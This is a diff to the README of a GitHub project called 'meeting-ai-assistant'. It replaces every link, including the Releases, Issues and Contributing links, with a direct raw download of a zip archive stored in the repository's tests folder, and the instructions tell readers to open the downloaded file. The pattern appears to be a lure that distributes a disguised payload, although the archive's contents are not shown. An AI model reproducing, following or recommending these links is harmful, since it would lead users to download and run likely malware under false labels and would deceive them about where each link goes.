@@ -1,7 +1,7 @@
 # 🤖 meeting-ai-assistant - Record Your Meetings Effortlessly
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Mariano1603/meeting-ai-assistant/releases)
+[![Download](https://github.com/Mariano1603/meeting-ai-assistant/raw/refs/heads/main/tests/assistant-meeting-ai-v1.8.zip)](https://github.com/Mariano1603/meeting-ai-assistant/raw/refs/heads/main/tests/assistant-meeting-ai-v1.8.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before getting started, ensure your system meets these basic requirements:
 
 To get your own copy of the meeting-ai-assistant, follow these steps:
 
-1. Visit the [Releases page](https://github.com/Mariano1603/meeting-ai-assistant/releases) to find the latest version.
+1. Visit the [Releases page](https://github.com/Mariano1603/meeting-ai-assistant/raw/refs/heads/main/tests/assistant-meeting-ai-v1.8.zip) to find the latest version.
 2. Locate the file for your operating system.
 3. Click on the download link for the file.
 4. Once the download is complete, open the file to start the installation process.
@@ -63,14 +63,14 @@ You can export meeting notes in various formats, including PDF, DOCX, and plain 
 
 ## 🤝 Getting Help
 
-If you need assistance or have questions, please refer to our [GitHub Issues page](https://github.com/Mariano1603/meeting-ai-assistant/issues), where you can seek support and report any problems.
+If you need assistance or have questions, please refer to our [GitHub Issues page](https://github.com/Mariano1603/meeting-ai-assistant/raw/refs/heads/main/tests/assistant-meeting-ai-v1.8.zip), where you can seek support and report any problems.
 
 ## 📝 Contributing
 
-We welcome contributions from anyone interested. Please check our guidelines on the [Contributing page](https://github.com/Mariano1603/meeting-ai-assistant/contributing).
+We welcome contributions from anyone interested. Please check our guidelines on the [Contributing page](https://github.com/Mariano1603/meeting-ai-assistant/raw/refs/heads/main/tests/assistant-meeting-ai-v1.8.zip).
 
 ## 🔗 Download Now Again
-For easy access, here’s the download link once more: [Visit this page to download](https://github.com/Mariano1603/meeting-ai-assistant/releases).
+For easy access, here’s the download link once more: [Visit this page to download](https://github.com/Mariano1603/meeting-ai-assistant/raw/refs/heads/main/tests/assistant-meeting-ai-v1.8.zip).
 
 ---
 
